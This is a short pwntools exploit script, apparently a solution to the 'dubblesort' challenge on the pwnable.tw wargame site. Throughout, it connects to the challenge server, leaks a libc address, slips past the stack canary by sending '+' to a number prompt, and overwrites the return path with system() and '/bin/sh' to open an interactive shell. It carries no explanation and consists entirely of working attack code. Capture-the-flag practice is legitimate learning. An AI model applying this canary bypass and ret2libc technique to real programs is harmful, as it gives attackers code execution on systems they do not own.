from pwn import *
p = remote('chall.pwnable.tw',10101)
# p = process('./dubblesort')
libc = ELF('./libc_32.so.6')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload = "a"*24
p.recvuntil(":")
p.sendline(payload)
libc_addr = u32(p.recv()[30:34])-0xa
libcbase_addr = libc_addr - 0x1b0000 #remote
# libcbase_addr = libc_addr - 0x1b3000   #local

sys = libcbase_addr + libc.symbols['system']
binsh = libcbase_addr + libc.search('/bin/sh').next()
p.sendline('35')
p.recv()
for i in range(24):
    p.sendline(str(i))
    p.recv()

p.sendline('+')
p.recv()
for i in range(9):
    p.sendline(str(sys))
    p.recv()
# gdb.attach(p)
p.sendline(str(binsh))

p.recv()
p.interactive()